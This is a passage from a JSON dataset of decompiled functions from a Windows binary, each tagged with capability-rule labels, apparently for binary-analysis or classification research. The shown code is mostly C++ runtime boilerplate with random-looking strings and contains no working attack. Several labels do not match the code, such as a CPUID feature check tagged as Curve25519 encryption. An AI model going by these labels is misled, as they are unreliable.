uVar2;\n        }\n        cVar1 = fcn.004032f6(arg_8h, arg_ch);\n        uVar2 = *arg_8h;\n        arg_8h_00 = extraout_EDX & 0xffffff00 | uVar2;\n        if (cVar1 != '\\0') {\n            fcn.00402e0a(arg_8h_00);\n            return arg_8h_00;\n        }\n        if (*arg_8h != 0x29) {\n            do {\n                uVar3 = uVar2;\n                if (uVar3 == 0) break;\n                if ((((9 < uVar3 - 0x30) && (0x19 < uVar3 + 0x9f)) && (0x19 < uVar3 + 0xbf)) && (uVar3 != 0x5f))\n                goto code_r0x004b629a;\n                uVar3 = **arg_ch;\n                uVar2 = uVar3;\n                *arg_ch = *arg_ch + 1;\n                *arg_8h = uVar3;\n            } while (uVar3 != 0x29);\n            if (uVar3 != 0x29) goto code_r0x004b629a;\n        }\n        uVar2 = 4;\n    }\n    else {\ncode_r0x004b629a:\n        cVar1 = fcn.004b6cda();\n        uVar2 = (-(cVar1 != '\\0') & 0xfffffffd) + 7;\n    }\n    return uVar2;\n}\n",
        "token_count": 775
    },
    "0040384b": {
        "rules": [
            "encrypt data using Curve25519/bbf924b96e5b4ce780ce59f68f21b030"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00462451)\n// WARNING: Removing unreachable block (ram,0x00462416)\n// WARNING: Removing unreachable block (ram,0x004624c8)\n\nuint fcn.0040384b(void)\n\n{\n    int32_t *piVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t in_XCR0;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x573c4c = 0;\n    *0x571c9c = *0x571c9c | 1;\n    iVar3 = (*_sym.imp.KERNEL32.dll_IsProcessorFeaturePresent)(10);\n    uVar4 = *0x571c9c;\n    if (iVar3 != 0) {\n        piVar1 = cpuid_basic_info(0);\n        puVar2 = cpuid_Version_info(1);\n        uVar5 = puVar2[3];\n        if (((piVar1[1] ^ 0x756e6547U | piVar1[3] ^ 0x6c65746eU | piVar1[2] ^ 0x49656e69U) == 0) &&\n           (((((uVar4 = *puVar2 & 0xfff3ff0,  uVar4 == 0x106c0 || (uVar4 == 0x20660)) || (uVar4 == 0x20670)) ||\n             ((uVar4 == 0x30650 || (uVar4 == 0x30660)))) || (uVar4 == 0x30670)))) {\n            *0x573c50 = *0x573c50 | 1;\n        }\n        if (*piVar1 < 7) {\n            uVar6 = 0;\n        }\n        else {\n            iVar3 = cpuid_Extended_Feature_Enumeration_info(7);\n            uVar6 = *(iVar3 + 4);\n            if ((uVar6 & 0x200) != 0) {\n                *0x573c50 = *0x573c50 | 2;\n            }\n        }\n        *0x573c4c = 1;\n        uVar4 = *0x571c9c | 2;\n        if ((uVar5 & 0x100000) != 0) {\n            uVar4 = *0x571c9c | 6;\n            *0x573c4c = 2;\n            if ((((uVar5 & 0x8000000) != 0) && ((uVar5 & 0x10000000) != 0)) && ((in_XCR0 & 6) == 6)) {\n                *0x573c4c = 3;\n                uVar4 = *0x571c9c | 0xe;\n                if ((uVar6 & 0x20) != 0) {\n                    *0x573c4c = 5;\n                    uVar4 = *0x571c9c | 0x2e;\n                    if (((uVar6 & 0xd0030000) == 0xd0030000) && ((in_XCR0 & 0xe0) == 0xe0)) {\n                        *0x571c9c = *0x571c9c | 0x6e;\n                        *0x573c4c = 6;\n                        uVar4 = *0x571c9c;\n                    }\n                }\n            }\n        }\n    }\n    *0x571c9c = uVar4;\n    return 0;\n}\n",
        "token_count": 865
    },
    "004012ad": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004012ad(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint arg_8h_01;\n    uint arg_ch_00;\n    uint *in_ECX;\n    uint var_45h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint *var_14h;\n    uint var_10h;\n    \n    var_18h = in_ECX[4];\n    var_14h = in_ECX;\n    iVar1 = fcn.0040257c();\n    if (iVar1 - var_18h < arg_8h) {\n        fcn.0040393b();\n    }\n    var_1ch = var_18h + arg_8h;\n    var_20h = var_14h[5];\n    var_24h = fcn.00403d23(var_1ch);\n    var_28h = fcn.0040407a();\n    var_2ch = fcn.004015aa(var_24h + 1);\n    fcn.00401b09();\n    var_14h[4] = var_1ch;\n    var_14h[5] = var_24h;\n    arg_8h_01 = fcn.00405290(var_2ch);\n    iVar1 = var_18h;\n    if (var_20h < 0x10) {\n        fcn.00403954(arg_8h_01, var_14h, var_18h, arg_10h, arg_14h, arg_18h);\n        fcn.004025b8(var_14h, &var_2ch);\n    }\n    else {\n        arg_8h_00 = *var_14h;\n        arg_ch_00 = fcn.00405290(arg_8h_00);\n        fcn.00403954(arg_8h_01, arg_ch_00, iVar1, arg_10h, arg_14h, arg_18h);\n        fcn.0040123a(arg_8h_00, var_20h + 1);\n        *var_14h = var_2ch;\n    }\n    return in_ECX;\n}\n",
        "token_count": 581
    },
    "004013ac": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004013ac(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x450220;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 3;\n    fcn.00401e79(\"qqfzstjtbrsxrw\");\n    uStack24 = 4;\n    fcn.00401e79(0x548e91);\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 226
    },
    "00401569": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401569(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uchar *arg_8h_00;\n    uint uVar2;\n    int32_t *in_ECX;\n    int32_t iVar3;\n    ulong uVar4;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar4 = fcn.00403f35();\n    iVar3 = uVar4 >> 0x20;\n    uVar1 = uVar4 == 0;\n    if ((SBORROW4(iVar3, uVar1) != false) == iVar3 - uVar1 < 0) {\n        arg_8h_00 = fcn.004027cf();\n        *arg_8h_00 = arg_8h;\n        var_ch = fcn.00403544(arg_8h_00);\n    }\n    else {\n        uVar2 = fcn.00403544(&arg_8h);\n        var_ch = (**(*in_ECX + 0xc))(uVar2);\n    }\n    return var_ch;\n}\n",
        "token_count": 245
    },
    "00401659": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00401659(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack24 = 0xffffffff;\n    uStack28 = 0x451820;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    fcn.00401e79(\"hmprhjlnsffubtoogvdhwpwjrfxtlyazqwifvevutnw\");\n    uStack24 = 0;\n    fcn.00401e79(\"xcamjtgnyeapvqeejx\");\n    uStack24 = 1;\n    fcn.00401e79(\"tjtq\");\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 239
    },
    "00401686": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401686(uint arg_8h, uint arg_ch)\n\n{\n    uint in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_10h = 0xffffffff;\n    var_14h = 0x426fa0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    fcn.004010b9();\n    fcn.00402ab8(0x533627, in_ECX);\n    fcn.00401f3c();\n    var_10h = 0;\n    fcn.00403058(arg_8h, arg_ch);\n    fcn.0040694c();\n    *in_FS_OFFSET = var_18h;\n    return in_ECX;\n}\n",
        "token_count": 243
    },
    "0040181b": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040181b(uint arg_8h)\n\n{\n    code **in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00404f61(arg_8h);\n    *in_ECX = vtable.std::ctype_base.0;\n    return;\n}\n",
        "token_count": 72
    },
    "00401a91": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401a91(code **param_1)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0040233d(0x545d9f);\n    *param_1 = vtable.std::bad_array_new_length.0;\n    return;\n}\n",
        "token_count": 70
    },
    "00401aaf": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint * __cdecl fcn.00401aaf(uint arg_8h, uint *arg_ch, uint arg_10h, uint noname_3, char *arg_18h, int32_t arg_1ch)\n\n{\n    char cVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    while (arg_1ch != 0) {\n        cVar1 = *arg_18h;\n        fcn.00406811();\n        fcn.00406776(cVar1);\n        arg_1ch = arg_1ch + -1;\n        fcn.00404acf();\n        arg_18h = arg_18h + 1;\n    }\n    *arg_ch = arg_10h;\n    arg_ch[1] = noname_3;\n    return arg_ch;\n}\n",
        "token_count": 200
    },
    "00401ae1": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401ae1(uint arg_8h)\n\n{\n    code **in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00402a77(arg_8h);\n    *in_ECX = vtable.std::system_error.0;\n    return;\n}\n",
        "token_count": 72
    },
    "00401be0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401be0(uint arg_8h)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_14h = 0x4510e0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 1;\n    fcn.00401e79(\"tntxyrpktrixcmyklzhywpsxcxjhctiwasnequpskrjzwlhybdbjsvsajawakizpyelqlie\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return 0xc72d;\n}\n",
        "token_count": 235
    },
    "00401c35": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401c35(int32_t param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    cVar1 = fcn.00404b47(&var_4h);\n    if (cVar1 == '\\0') {\ncode_r0x004a6880:\n        uVar2 = 0;\n    }\n    else {\n        cVar1 = fcn.00404331();\n        if (cVar1 != '\\0') {\n            iVar3 = fcn.00404309();\n            if (iVar3 == 0) {\ncode_r0x004a6898:\n                puVar4 = fcn.00403a35();\n                *puVar4 = 0x16;\n                fcn.004037ce();\n                goto code_r0x004a6880;\n            }\n            iVar3 = fcn.00402798(*(param_1 + 0x2c));\n            if (iVar3 == 1) {\n                *var_4h = *(param_1 + 0x18);\n            }\n            else if (iVar3 == 2) {\n                *var_4h = *(param_1 + 0x18);\n            }\n            else if (iVar3 == 4) {\n                *var_4h = *(param_1 + 0x18);\n            }\n            else {\n                if (iVar3 != 8) goto code_r0x004a6898;\n                iVar3 = *(param_1 + 0x18);\n                *var_4h = iVar3;\n                var_4h[1] = iVar3 >> 0x1f;\n            }\n            *(param_1 + 0x30) = 1;\n        }\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 423
    },
    "00401cb7": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid __cdecl fcn.00401cb7(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x4515a0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 2;\n    fcn.00401e79(\"azxsxfkucpwvtcthrkosobgoccgushisqxyvsrjyirpfmrakqcfegwadjhuse\");\n    uStack24 = 3;\n    fcn.00401e79(\"lmkycpjbcqvensaqthpgfkywilwmmwvmlpwgwirqbkankcsbxooqqpb\");\n    uStack24 = 4;\n    fcn.00401e79(\"qnbqchutd\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return;\n}\n",
        "token_count": 291
    },
    "00401d66": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401d66(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00402c84();\n    if (uVar1 < arg_8h) {\n        fcn.00402f40(arg_8h - uVar1, arg_ch & 0xffff);\n    }\n    else {\n        fcn.00403981(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 127
    },
    "00401e79": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401e79(uint arg_8h)\n\n{\n    uint in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_10h = 0xffffffff;\n    var_14h = 0x426e60;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    fcn.004010b9();\n    fcn.00402ab8(0x533627, in_ECX);\n    fcn.00401f3c();\n    var_10h = 0;\n    fcn.00405808(arg_8h);\n    fcn.0040694c();\n    *in_FS_OFFSET = var_18h;\n    return in_ECX;\n}\n",
        "token_count": 237
    },
    "00401f19": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00401f19(uint32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    uint arg_8h_01;\n    uint arg_ch_00;\n    uint *in_ECX;\n    uint var_44h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint *var_14h;\n    uint var_10h;\n    \n    var_18h = in_ECX[4];\n    var_14h = in_ECX;\n    iVar1 = fcn.0040257c();\n    if (iVar1 - var_18h < arg_8h) {\n        fcn.0040393b();\n    }\n    var_1ch = var_18h + arg_8h;\n    var_20h = var_14h[5];\n    var_24h = fcn.00403d23(var_1ch);\n    var_28h = fcn.0040407a();\n    var_2ch = fcn.004015aa(var_24h + 1);\n    fcn.00401b09();\n    var_14h[4] = var_1ch;\n    var_14h[5] = var_24h;\n    arg_8h_01 = fcn.00405290(var_2ch);\n    iVar1 = var_18h;\n    if (var_20h < 0x10) {\n        fcn.00401f8c(arg_8h_01, var_14h, var_18h, arg_10h, arg_14h);\n        fcn.004025b8(var_14h, &var_2ch);\n    }\n    else {\n        arg_8h_00 = *var_14h;\n        arg_ch_00 = fcn.00405290(arg_8h_00);\n        fcn.00401f8c(arg_8h_01, arg_ch_00, iVar1, arg_10h, arg_14h);\n        fcn.0040123a(arg_8h_00, var_20h + 1);\n        *var_14h = var_2ch;\n    }\n    return in_ECX;\n}\n",
        "token_count": 570
    },
    "00401fb9": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00401fb9(uint arg_8h)\n\n{\n    uint32_t arg_8h_00;\n    uint arg_ch;\n    uint in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.0040407a();\n    arg_ch = fcn.00403495(arg_8h_00);\n    fcn.004018ed(arg_8h_00 & 0xffffff00 | var_8h, arg_ch);\n    fcn.00404ea3(0x533627);\n    fcn.0040614a(arg_8h);\n    return in_ECX;\n}\n",
        "token_count": 164
    },
    "00402063": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00402063(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    \n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    puVar1 = *(*(param_1 + 0x14) + -4);\n    iVar2 = fcn.00404309();\n    if (iVar2 == 0) {\ncode_r0x004a693b:\n        puVar3 = fcn.00403a35();\n        *puVar3 = 0x16;\n        uVar4 = fcn.004037ce();\n        uVar4 = uVar4 & 0xffffff00;\n    }\n    else {\n        iVar2 = fcn.00402798(*(param_1 + 0x2c));\n        if (iVar2 == 1) {\n            uVar4 = 0;\n            *puVar1 = *(param_1 + 0x18);\n        }\n        else if (iVar2 == 2) {\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = *(param_1 + 0x18);\n        }\n        else if (iVar2 == 4) {\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = uVar4;\n        }\n        else {\n            if (iVar2 != 8) goto code_r0x004a693b;\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = uVar4;\n            puVar1[1] = uVar4 >> 0x1f;\n        }\n        *(param_1 + 0x30) = 1;\n        uVar4 = CONCAT31(uVar4 >> 8, 1);\n    }\n    return uVar4;\n}\n",
        "token_count": 430
    },
    "00402298": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nfloat10 __cdecl fcn.00402298(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x450640;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 1;\n    fcn.00401e79(0x54aab1);\n    uStack24 = 2;\n    fcn.00401e79(\"gppzimmnoazuvnjodrsjvfrbfoyivaptrcmapbgvwruknpwkywxtlzrsoyqpvdowwqkcqmdbxhwsjoqjqoyvbtsqjsm\");\n    uStack24 = 3;\n    fcn.00401e79(\"mzate\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return *0x546df4;\n}\n",
        "token_count": 279
    },
    "004023c4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.004023c4(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    \n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    puVar1 = *(*(param_1 + 0x14) + -4);\n    iVar2 = fcn.00404309();\n    if (iVar2 == 0) {\ncode_r0x004a6432:\n        puVar3 = fcn.00403a35();\n        *puVar3 = 0x16;\n        uVar4 = fcn.004037ce();\n        uVar4 = uVar4 & 0xffffff00;\n    }\n    else {\n        iVar2 = fcn.00402798(*(param_1 + 0x2c));\n        if (iVar2 == 1) {\n            uVar4 = 0;\n            *puVar1 = *(param_1 + 0x18);\n        }\n        else if (iVar2 == 2) {\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = *(param_1 + 0x18);\n        }\n        else if (iVar2 == 4) {\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = uVar4;\n        }\n        else {\n            if (iVar2 != 8) goto code_r0x004a6432;\n            uVar4 = *(param_1 + 0x18);\n            *puVar1 = uVar4;\n            puVar1[1] = uVar4 >> 0x1f;\n        }\n        *(param_1 + 0x30) = 1;\n        uVar4 = CONCAT31(uVar4 >> 8, 1);\n    }\n    return uVar4;\n}\n",
        "token_count": 431
    },
    "004024d2": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004024d2(int32_t param_1)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    cVar1 = fcn.004017b7(&var_4h);\n    if (cVar1 == '\\0') {\ncode_r0x004a6a5e:\n        uVar2 = 0;\n    }\n    else {\n        cVar1 = fcn.004059b1();\n        if (cVar1 != '\\0') {\n            iVar3 = fcn.00404309();\n            if (iVar3 == 0) {\ncode_r0x004a6a76:\n                puVar4 = fcn.00403a35();\n                *puVar4 = 0x16;\n                fcn.004037ce();\n                goto code_r0x004a6a5e;\n            }\n            iVar3 = fcn.00402798(*(param_1 + 0x2c));\n            if (iVar3 == 1) {\n                *var_4h = *(param_1 + 0x18);\n            }\n            else if (iVar3 == 2) {\n                *var_4h = *(param_1 + 0x18);\n            }\n            else if (iVar3 == 4) {\n                *var_4h = *(param_1 + 0x18);\n            }\n            else {\n                if (iVar3 != 8) goto code_r0x004a6a76;\n                iVar3 = *(param_1 + 0x18);\n                *var_4h = iVar3;\n                var_4h[1] = iVar3 >> 0x1f;\n            }\n            *(param_1 + 0x30) = 1;\n        }\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 430
    },
    "0040251d": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.0040251d(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x451400;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 2;\n    fcn.00401e79(\"acrvdmfczldvhpqphdh\");\n    uStack24 = 3;\n    fcn.00401e79(\"osoxwoskkvbvjcwcnctsktpprnqietkyogwshumnujckithqrw\");\n    uStack24 = 4;\n    fcn.00401e79(\"icmoctjdkofaubqjnknkajiokpckyavsmn\");\n    uStack24 = 5;\n    fcn.00401e79(\"bwnqqdquarmrmveiffqjhmdnhpjelcyyifbvwqftymedoikih\");\n    uStack24 = 6;\n    fcn.00401e79(\"yulq\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 371
    },
    "004025c7": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004025c7(uint arg_8h)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_14h = 0x44ff00;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 1;\n    fcn.00401e79(\"adyjxnyzzjyegg\");\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return arg_8h;\n}\n",
        "token_count": 201
    },
    "0040267b": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040267b(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.004062a3(&var_14h);\n    *(in_ECX + 8) = var_14h;\n    *(in_ECX + 0xc) = var_10h;\n    *(in_ECX + 0x10) = var_ch;\n    *(in_ECX + 0x14) = var_8h;\n    return;\n}\n",
        "token_count": 148
    },
    "00402716": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402716(uint arg_8h)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_14h = 0x4514e0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 1;\n    fcn.00401e79(\"yvfjtrierxylrmgm\");\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return arg_8h;\n}\n",
        "token_count": 202
    },
    "0040299b": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa",
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.0040299b(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x418250;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 4;\n    fcn.00401e79(\"fobbhtzqrkcimxnsebyvgzrouuh\");\n    uStack24 = 5;\n    fcn.00401e79(\"hlctamgpzzidyfpfputvxwq\");\n    uStack24 = 6;\n    fcn.00401e79(\"mdunvuihxjybpqbxiif\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 287
    },
    "004029aa": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint * __cdecl fcn.004029aa(uint arg_8h, uint *arg_ch, uint arg_10h, uint noname_3, uint arg_18h, int32_t arg_1ch)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    while (arg_1ch != 0) {\n        fcn.00406811();\n        fcn.00406776(arg_18h);\n        arg_1ch = arg_1ch + -1;\n        fcn.00404acf();\n    }\n    *arg_ch = arg_10h;\n    arg_ch[1] = noname_3;\n    return arg_ch;\n}\n",
        "token_count": 168
    },
    "00402a77": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402a77(int32_t arg_8h)\n\n{\n    code **in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.004040e8(arg_8h);\n    *in_ECX = vtable.std::_System_error.0;\n    in_ECX[3] = *(arg_8h + 0xc);\n    in_ECX[4] = *(arg_8h + 0x10);\n    return;\n}\n",
        "token_count": 111
    },
    "00402afe": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
